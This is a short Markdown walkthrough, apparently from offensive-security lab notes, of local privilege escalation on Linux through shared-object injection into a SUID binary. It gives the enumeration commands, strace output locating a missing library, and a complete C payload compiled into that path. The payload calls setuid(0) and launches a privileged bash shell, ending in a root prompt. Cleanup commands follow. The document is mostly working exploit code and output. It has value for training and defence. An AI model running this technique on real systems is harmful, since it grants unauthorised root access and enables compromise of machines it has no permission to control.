---
author(s):
  - Userware
tags:
  - post-exploitation
  - privilege-escalation
  - living-off-the-land
  - linux
---
# Living off the Land

## 01 - Enumerate

A SUID binary file is vulnerable to shared object injection.

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
```

Let's execute the SUID binary.

```
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
```

Now we have to run the `strace` to see what we can find while filtering with the `grep` command to find errors like "no such file"

```
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

Looks like we have a better place to insert our own modification to exploit the shared object library and it starts in `/home/user/.config/libcalc.so` and it's missing a `.config` hidden directory. Let's compile it and run the binary once again to gain root privileges.

## 02 - Exploit

```
user@debian:~$ cat > libcalc.c << EOF
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
EOF
user@debian:~$ mkdir /home/user/.config
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
user@debian:~$ /usr/local/bin/suid-so
bash-4.1# whoami
root
```

## 03 - Cleanup

```
bash-4.1# exit
user@debian:~$ rm -rf /home/user/.config/
user@debian:~$ rm libcalc.c
```